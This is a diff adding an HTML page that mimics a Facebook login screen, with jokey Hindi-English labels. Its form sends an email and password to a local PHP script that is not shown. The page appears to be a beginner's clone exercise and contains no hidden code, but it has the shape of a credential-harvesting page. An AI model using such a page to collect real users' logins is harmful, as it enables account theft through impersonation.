@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<style>
+    .like {
+
+        position: absolute;
+
+        top: 35px;
+
+        left: 20px;
+
+        transform: rotate(-25deg);
+
+    }
+
+
+
+    .pro {
+
+        position: absolute;
+
+        top: 120px;
+
+        left: 295px;
+
+        overflow: none;
+
+        border-radius: 80px;
+
+    }
+
+    .div {
+
+        width: 350px full;
+
+        height: 170px;
+
+        background-color: rgb(46, 75, 138);
+
+        border-radius: 20px;
+
+    }
+
+    /* facebook logo  */
+
+    h1 {
+
+        color: #fff;
+
+        position: absolute;
+
+        left: 80px;
+
+        top: 30px;
+
+        bottom: 380px;
+
+        font-size: 50px;
+
+    }
+
+    /* logo end */
+
+    /*width and height of login box*/
+
+    .log {
+
+        position: absolute;
+
+        top: 250px;
+
+        width: 290px;
+
+        left: 20px;
+
+
+
+    }
+
+    /* position of login box decoration etc*/
+
+    .log input {
+
+        width: 100%;
+
+        margin: 15px;
+
+    }
+
+    .log input[type="email"],
+
+    .log input[type="password"] {
+
+        border: none;
+
+        border-bottom: 0.3px solid grey;
+
+        outline: none;
+
+        background-color: transparent;
+
+    }
+
+
+    .log input[type="email"]:focus,
+
+    .log input[type="password"]:focus {
+
+        border-bottom: 0.3px solid rgb(36, 75, 136);
+
+    }
+
+    /* end the login form decoration etc.  */
+
+
+    /* submit botton decoration */
+
+    .log input[type="submit"] {
+
+        position: absolute;
+
+        height: 40px;
+
+        border: 0px;
+
+        color: white;
+
+        background: rgb(36, 75, 138);
+
+        border-radius: 20px;
+
+        outline: none;
+
+
+
+    }
+
+
+    /* submit button decoration end */
+
+    /* forget password link */
+
+    .log a {
+
+        position: absolute;
+
+        top: 170px;
+
+        color: rgb(36, 75, 138);
+
+        text-decoration: none;
+
+        left: 90px;
+
+    }
+
+    /*end   */
+
+
+    /*fieldset legend section  */
+
+    .extra {
+
+        position: absolute;
+
+        left: 0px;
+
+        top: 217px;
+
+        border-right: none;
+
+        border-left: none;
+
+        border-bottom: none;
+
+        width: 290px;
+
+        height: 1px;
+
+    }
+
+
+    .extra legend {
+
+        text-align: center;
+
+    }
+
+
+    /*end legend section */
+
+    /* last of these new account creating link */
+
+
+    button {
+
+        position: absolute;
+
+        top: 125px;
+
+        width: 289px;
+
+        height: 35px;
+
+        left: 15px;
+
+        border: none;
+        background-color: #0e458f;
+        color: white;
+
+
+        text-align: center;
+
+        border-radius: 20px;
+
+    }
+
+
+    /* end the account link decoration */
+
+
+
+
+    /*langurage section decoration */
+
+
+    ul {
+
+        position: absolute;
+
+        top: 170px;
+
+        left: 70px;
+
+        display: flex;
+
+    }
+
+    ul li {
+
+        list-style: dotted;
+
+        color: grey;
+
+    }
+
+
+    ul li:nth-child(1) {
+
+        position: absolute;
+
+        list-style: none;
+
+        top: 0px;
+
+        left: 30px;
+
+    }
+
+    ul li:nth-child(2) {
+
+        position: absolute;
+
+        top: px;
+
+        left: 83px;
+
+    }
+
+
+    ul li:nth-child(3) {
+
+        position: absolute;
+
+        top: 0px;
+
+        left: 160px;
+
+    }
+
+    .j {
+        background-color: black;
+        color: white;
+
+    }
+
+    /* end language section decoration*/
+</style>
+
+<body>
+    <div class="div">
+
+        <ul>
+
+            <li></li>
+
+            <li>English</li>
+
+        </ul>
+
+        <!-- end languagr -->
+
+        <!-- facebook logo -->
+
+        <h1>facebook</h1></a>
+
+        <!-- end facebook logo -->
+
+        <!-- user name and password section start-->
+
+        <div class="log">
+
+            <form method="post" action="myphp.php">
+
+                <input type="email" placeholder="Email hai to email dal nahi to phone number dal " name="un" required
+                    id="email">
+
+                <input type="password" name="ps" placeholder="Chal ab password dal" required id="pass">
+
+                <button onclick="logged()">Ghus Andar</button>
+
+                <!-- user name and pass end  -->
+
+                <!-- forget link section -->
+
+                <a id="fogg" href="#"> PASSWORD NAHI PATA </a>
+
+                <!-- Or section  -->
+
+                <fieldset class="extra">
+                    <legend>OR</legend>
+                </fieldset>
+
+                <!--  end our section-->
+
+                <!-- new accounting creating section -->
+
+                <button onclick="create()" class='log'> ACCOUNT NAHI HAI TO NAYA BANA</button>
+
+                <!--  end this section -->
+
+            </form>
+
+        </div>
+
+
+    </div>
+
+    <br />
+
+
+
+
+    <br /><br /> <br /><br /> <br /><br /> <br /><br /> <br /><br /> <br /><br /> <br /><br /> <br /><br />
+    <br /><br /><br /><br />
+    <p class="j">
+
+        &copy copyright2020 & created by SAURABH BHOI
+
+    </p>
+    <script>
+
+        function logged() {
+            let email = document.getElementById('email');
+            let pass = document.getElementById('pass');
+            // console.log(email);
+            if (email.value == "" || pass.value == "") {
+                document.write("Please enter email or Password");
+            }
+            else {
+                document.write("<br>")
+                var l = "Sucessesfully You Logged In ";
+                var c = "<br/>this page will be upadated soon"
+                document.write(l + c);
+            }
+
+        }
+        /* end  */
+        /* click the create new account section after what */
+        function create() {
+            var a = "your account not created this time <br/>please try again letter ";
+            var b = "<br/> update comming soon";
+            document.write(a + b)
+        }
+    </script>
+</body>
+
+</html>
